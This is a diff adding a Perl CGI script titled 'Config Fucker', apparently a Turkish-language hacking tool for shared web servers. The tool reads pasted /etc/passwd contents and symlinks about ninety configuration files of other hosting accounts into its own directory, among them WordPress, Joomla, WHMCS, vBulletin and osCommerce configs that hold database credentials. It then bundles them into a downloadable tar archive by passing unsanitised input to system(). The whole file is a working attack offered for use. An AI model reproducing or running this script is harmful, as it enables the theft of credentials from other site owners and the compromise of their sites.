@@ -1,0 +1,178 @@
+#!/usr/bin/perl -I/usr/local/bandmin
+print "Content-type: text/html\n\n";
+print'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Language" content="en-us" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Config Fucker</title>
+<style type="text/css">
+.dz {
+    font-family: Tahoma;
+    font-size: 14px;
+    font-weight: bold;
+    color: #3333ff;
+    text-align: center;
+    text-shadow: black 0px 0px 2px;
+}
+#checkouttextarea {
+
+  webkit-border-radius: 15px;
+
+}
+:hover#checkouttextarea {opacity: 0.6; background-color:333333}
+</style>
+</head>
+';
+sub lil{
+    ($user) = @_;
+$msr = qx{pwd};
+$kola=$msr."/".$user;
+$kola=~s/\n//g; 
+symlink('/home/'.$user.'/public_html/includes/configure.php',$kola.'-shop.txt');
+symlink('/home/'.$user.'/public_html/os/includes/configure.php',$kola.'-shop-os.txt');
+symlink('/home/'.$user.'/public_html/oscom/includes/configure.php',$kola.'-oscom.txt');
+symlink('/home/'.$user.'/public_html/oscommerce/includes/configure.php',$kola.'-oscommerce.txt');
+symlink('/home/'.$user.'/public_html/oscommerces/includes/configure.php',$kola.'-oscommerces.txt');
+symlink('/home/'.$user.'/public_html/shop/includes/configure.php',$kola.'-shop2.txt');
+symlink('/home/'.$user.'/public_html/shopping/includes/configure.php',$kola.'-shop-shopping.txt');
+symlink('/home/'.$user.'/public_html/sale/includes/configure.php',$kola.'-sale.txt');
+symlink('/home/'.$user.'/public_html/amember/config.inc.php',$kola.'-amember.txt');
+symlink('/home/'.$user.'/public_html/config.inc.php',$kola.'-amember2.txt');
+symlink('/home/'.$user.'/public_html/members/configuration.php',$kola.'-members.txt');
+symlink('/home/'.$user.'/public_html/config.php',$kola.'-2.txt');
+symlink('/home/'.$user.'/public_html/forum/includes/config.php',$kola.'-forum.txt');
+symlink('/home/'.$user.'/public_html/forums/includes/config.php',$kola.'-forums.txt');
+symlink('/home/'.$user.'/public_html/admin/conf.php',$kola.'-5.txt');
+symlink('/home/'.$user.'/public_html/admin/config.php',$kola.'-4.txt');
+symlink('/home/'.$user.'/public_html/wp-config.php',$kola.'-wp13.txt');
+symlink('/home/'.$user.'/public_html/wp/wp-config.php',$kola.'-wp13-wp.txt');
+symlink('/home/'.$user.'/public_html/WP/wp-config.php',$kola.'-wp13-WP.txt');
+symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$kola.'-wp13-wp-beta.txt');
+symlink('/home/'.$user.'/public_html/beta/wp-config.php',$kola.'-wp13-beta.txt');
+symlink('/home/'.$user.'/public_html/press/wp-config.php',$kola.'-wp13-press.txt');
+symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$kola.'-wp13-wordpress.txt');
+symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$kola.'-wp13-Wordpress.txt');
+symlink('/home/'.$user.'/public_html/wordpress/beta/wp-config.php',$kola.'-wp13-wordpress-beta.txt');
+symlink('/home/'.$user.'/public_html/news/wp-config.php',$kola.'-wp13-news.txt');
+symlink('/home/'.$user.'/public_html/new/wp-config.php',$kola.'-wp13-new.txt');
+symlink('/home/'.$user.'/public_html/blog/wp-config.php',$kola.'-wp-blog.txt');
+symlink('/home/'.$user.'/public_html/beta/wp-config.php',$kola.'-wp-beta.txt');
+symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$kola.'-wp-blogs.txt');
+symlink('/home/'.$user.'/public_html/home/wp-config.php',$kola.'-wp-home.txt');
+symlink('/home/'.$user.'/public_html/protal/wp-config.php',$kola.'-wp-protal.txt');
+symlink('/home/'.$user.'/public_html/site/wp-config.php',$kola.'-wp-site.txt');
+symlink('/home/'.$user.'/public_html/main/wp-config.php',$kola.'-wp-main.txt');
+symlink('/home/'.$user.'/public_html/test/wp-config.php',$kola.'-wp-test.txt');
+symlink('/home/'.$user.'/public_html/conf_global.php',$kola.'-6.txt');
+symlink('/home/'.$user.'/public_html/include/db.php',$kola.'-7.txt');
+symlink('/home/'.$user.'/public_html/connect.php',$kola.'-8.txt');
+symlink('/home/'.$user.'/public_html/mk_conf.php',$kola.'-9.txt');
+symlink('/home/'.$user.'/public_html/include/config.php',$kola.'-12.txt');
+symlink('/home/'.$user.'/public_html/joomla/configuration.php',$kola.'-joomla2.txt');
+symlink('/home/'.$user.'/public_html/protal/configuration.php',$kola.'-joomla-protal.txt');
+symlink('/home/'.$user.'/public_html/joo/configuration.php',$kola.'-joo.txt');
+symlink('/home/'.$user.'/public_html/cms/configuration.php',$kola.'-joomla-cms.txt');
+symlink('/home/'.$user.'/public_html/site/configuration.php',$kola.'-joomla-site.txt');
+symlink('/home/'.$user.'/public_html/main/configuration.php',$kola.'-joomla-main.txt');
+symlink('/home/'.$user.'/public_html/news/configuration.php',$kola.'-joomla-news.txt');
+symlink('/home/'.$user.'/public_html/new/configuration.php',$kola.'-joomla-new.txt');
+symlink('/home/'.$user.'/public_html/home/configuration.php',$kola.'-joomla-home.txt');
+symlink('/home/'.$user.'/public_html/vb/includes/config.php',$kola.'-vb.txt');
+symlink('/home/'.$user.'/public_html/vb3/includes/config.php',$kola.'-vb3.txt');
+symlink('/home/'.$user.'/public_html/includes/config.php',$kola.'-includes-vb.txt');
+symlink('/home/'.$user.'/public_html/whm/configuration.php',$kola.'-whm15.txt');
+symlink('/home/'.$user.'/public_html/central/configuration.php',$kola.'-whm-central.txt');
+symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$kola.'-whm-whmcs.txt');
+symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$kola.'-whm-WHMCS.txt');
+symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$kola.'-whmc-WHM.txt');
+symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$kola.'-whmcs.txt');
+symlink('/home/'.$user.'/public_html/support/configuration.php',$kola.'-support.txt');
+symlink('/home/'.$user.'/public_html/supp/configuration.php',$kola.'-supp.txt');
+symlink('/home/'.$user.'/public_html/secure/configuration.php',$kola.'-sucure.txt');
+symlink('/home/'.$user.'/public_html/secure/whm/configuration.php',$kola.'-sucure-whm.txt');
+symlink('/home/'.$user.'/public_html/secure/whmcs/configuration.php',$kola.'-sucure-whmcs.txt');
+symlink('/home/'.$user.'/public_html/cpanel/configuration.php',$kola.'-cpanel.txt');
+symlink('/home/'.$user.'/public_html/panel/configuration.php',$kola.'-panel.txt');
+symlink('/home/'.$user.'/public_html/host/configuration.php',$kola.'-host.txt');
+symlink('/home/'.$user.'/public_html/hosting/configuration.php',$kola.'-hosting.txt');
+symlink('/home/'.$user.'/public_html/hosts/configuration.php',$kola.'-hosts.txt');
+symlink('/home/'.$user.'/public_html/configuration.php',$kola.'-joomla.txt');
+symlink('/home/'.$user.'/public_html/submitticket.php',$kola.'-whmcs2.txt');
+symlink('/home/'.$user.'/public_html/clients/configuration.php',$kola.'-clients.txt');
+symlink('/home/'.$user.'/public_html/client/configuration.php',$kola.'-client.txt');
+symlink('/home/'.$user.'/public_html/clientes/configuration.php',$kola.'-clientes.txt');
+symlink('/home/'.$user.'/public_html/cliente/configuration.php',$kola.'-client.txt');
+symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$kola.'-clientsupport.txt');
+symlink('/home/'.$user.'/public_html/billing/configuration.php',$kola.'-billing.txt'); 
+symlink('/home/'.$user.'/public_html/manage/configuration.php',$kola.'-whm-manage.txt'); 
+symlink('/home/'.$user.'/public_html/my/configuration.php',$kola.'-whm-my.txt'); 
+symlink('/home/'.$user.'/public_html/myshop/configuration.php',$kola.'-whm-myshop.txt'); 
+symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$kola.'-zencart.txt'); 
+symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$kola.'-shop-zencart.txt'); 
+symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$kola.'-shop-ZCshop.txt'); 
+symlink('/home/'.$user.'/public_html/Settings.php',$kola.'-smf.txt'); 
+symlink('/home/'.$user.'/public_html/smf/Settings.php',$kola.'-smf2.txt'); 
+symlink('/home/'.$user.'/public_html/forum/Settings.php',$kola.'-smf-forum.txt'); 
+symlink('/home/'.$user.'/public_html/forums/Settings.php',$kola.'-smf-forums.txt'); 
+symlink('/home/'.$user.'/public_html/upload/includes/config.php',$kola.'-up.txt'); 
+symlink('/home/'.$user.'/public_html/up/includes/config.php',$kola.'-up2.txt'); 
+}
+if ($ENV{'REQUEST_METHOD'} eq 'POST') {
+  read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
+} else {
+  $buffer = $ENV{'QUERY_STRING'};
+}
+@pairs = split(/&/, $buffer);
+foreach $pair (@pairs) {
+  ($name, $value) = split(/=/, $pair);
+  $name =~ tr/+/ /;
+  $name =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
+  $value =~ tr/+/ /;
+  $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
+  $FORM{$name} = $value;
+}
+if ($FORM{pass} eq ""){
+print '
+<body class="dz" bgcolor="#F4F4F4">
+<p>WebRooT Config Fucker</p>
+<p>WebRooT.info</p>
+<span><font color="red">Kullanimi:</font> Passwd icerigini asagidaki bosluga yapistiriniz.. => <font color="black">cat /etc/passwd</font></span><br />
+<br /><form method="post"><strong>
+<textarea id="checkouttextarea" name="pass" style="border:1px dotted #00FFFF; width:  498px; height: 370px; background-color:#F4F4F4; font-family:Tahoma; font-size:9pt; color: black"  ></textarea><br />
+&nbsp;<p>
+<input name="tar" type="text" style="border:1px dotted #00FFFF; width: 212px; background-color:#F4F4F4; font-family:Tahoma; font-size:8pt; color:black; "  /><br />
+&nbsp;</p>
+<p>
+<input name="Submit1" type="submit" value="Config Cek" style="border:1px dotted #00FFFF; width: 99; font-family:Tahoma; font-size:10pt; color: black; text-transform:uppercase; height:23; background-color:#F4F4F4;" /></p>
+</form></strong>
+';
+}else{
+@lines =<$FORM{pass}>;
+$y = @lines;
+open (MYFILE, ">tar.tmp");
+print MYFILE "tar -czf ".$FORM{tar}.".tar ";
+for ($ka=0;$ka<$y;$ka++){
+while(@lines[$ka]  =~ m/(.*?):x:/g){
+&lil($1);
+print MYFILE $1.".txt ";
+for($kd=1;$kd<18;$kd++){
+print MYFILE $1.$kd.".txt ";
+}
+}
+ }
+print'<body class="dz" bgcolor="#F4F4F4">
+<h2>TamamLandi..!</h2>
+<p>&nbsp;</p>';
+if($FORM{tar} ne ""){
+open(INFO, "tar.tmp");
+@lines =<INFO> ;
+close(INFO);
+system(@lines);
+print'<p><a href="'.$FORM{tar}.'.tar"><font color="#00FF00">
+<span style="text-decoration: none">Click Here To Download Tar File</span></font></a></p>';
+}
+}
+ print"
+</body>
+</html>";
